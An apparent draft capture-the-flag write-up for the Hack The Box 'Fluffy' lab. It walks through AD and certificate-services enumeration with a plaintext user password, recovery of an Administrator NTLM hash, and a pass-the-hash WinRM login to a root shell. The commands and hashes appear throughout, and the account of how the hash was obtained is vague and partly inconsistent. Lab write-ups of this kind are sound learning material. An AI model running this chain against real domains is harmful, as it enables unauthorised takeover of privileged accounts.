# HTB: Fluffy - *Draft*

**Target:** `DC01.fluffy.htb`  
**Target IPs seen in logs:** `10.10.11.69`
**Attacker IP:** `10.10.14.2`

---

## TL;DR
AD enumeration + ADCS probing led to Administrator NTLM hash recovery, which was used with hash-based WinRM login to get an Administrator shell and capture the flag.

---

## Engagement Goals
- Map AD/LDAP and related services.  
- Enumerate ADCS (Certificate Services) and certificate templates.  
- Recover credentials / NTLM hashes for privileged accounts.  
- Use recovered artifacts to authenticate to WinRM and capture Administrator flag.

---

### Initial discovery
Start with a quick service scan to identify active hosts and likely AD endpoints.

```bash
# example nmap pattern found in logs
sudo nmap -sV -sC -A -Pn -oN logs/nmap-full 10.129.96.54
```

Focus on ports: 389 (LDAP), 135/139/445 (RPC/SMB), 5985/5986 (WinRM).

---

### LDAP / AD enumeration
Use available tooling to query LDAP/AD for domain objects and to discover ADCS.

```bash
# run LDAP enumeration with discovered user
netexec ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -M adcs
```

Observed outputs (condensed):
```
LDAP    10.10.11.69:389  -> DC01 (Windows Server 2019)
[+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
[*] Searching for PKI Enrollment Service objects (objectClass=pKIEnrollmentService)
[*] Found PKI Enrollment Server: DC01.fluffy.htb
[*] Enumerating certificate templates and issuance policies
```

Notes: `j.fleischman` credentials were present in the collected data and used to probe ADCS templates and CA settings.

---

### ADCS probing & template analysis
Query template ACLs and look for templates that allow machine or user enrollment with weak ACLs. In this run the ADCS enumeration returned template metadata and issuance policies; that activity produced useful artifacts leading to credential/hash recovery.

```
[*] Enumerating templates
[*] Checking issuance policies and template ACLs
[*] Identifying templates enabled for enrollment
```

(Exact template names and ACLs are in the raw appendix if you want the verbatim lines.)

---

### Extract NTLM hash
During enumeration a privileged hash was recovered for the Administrator account. The log contains this line:

```
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

---

### Authenticate to WinRM using hash
Administrator hash to authenticate to WinRM with evil-winrm. The logs record the exact invocation used to get a shell.

```bash
# reproduced from logs
evil-winrm-py -i dc01.fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```

Session excerpt:
```
evil-winrm-py PS C:\Users\Administrator\Documents>
... navigate to Desktop ...
PS C:\Users\Administrator\Desktop> cat root.txt
<root flag text>
```

That completed the box: Administrator shell obtained and flag captured.

---

## Artifacts & Evidence
- Domain user: `fluffy.htb\j.fleischman` with password `J0elTHEM4n1990!`.  
- Administrator NTLM hash: `aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e`  
- WinRM hash-authentication command: `evil-winrm-py -i dc01.fluffy.htb -u administrator -H <hash>`  

---

## Housekeeping / Cleanup (lab)
- Deleted any uploaded files used during exploitation (the logs show `exploit.zip` was transferred at one point).  
- Removed temporary files from `C:\Windows\Temp` and user profile temp folders.  
- Checkd for created scheduled tasks / services (none explicitly recorded in the provided logs, but confirm before leaving the host).

---

## Recommendations & Lessons
- ADCS should be treated as high-risk: lock down template ACLs, limit who can request/enroll templates, and audit CA operations.  
- Monitor abnormal ADCS queries and unusual template reads — these are strong indicators of enumeration attempts.  
- Keep domain credential reuse low; a single user credential led to deep enumeration that ultimately yielded an Administrator artifact.

---

## Raw terminal appendix

### AD / LDAP / ADCS enumeration
```
netexec ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -M adcs
LDAP        10.10.11.69     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
[+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
ADCS        10.10.11.69     389    DC01             [*] Starting search with search filter '(objectClass=pKIEnrollmentService)'
[*] Found PKI Enrollment Server: DC01.fluffy.htb
[*] Enumerating certificate templates and issuance policies
```

### NTLM hash discovery
```
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

### WinRM hash login and flag
```
evil-winrm-py -i dc01.fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
evil-winrm-py PS C:\Users\Administrator\Desktop> cat root.txt
<root flag content>
```



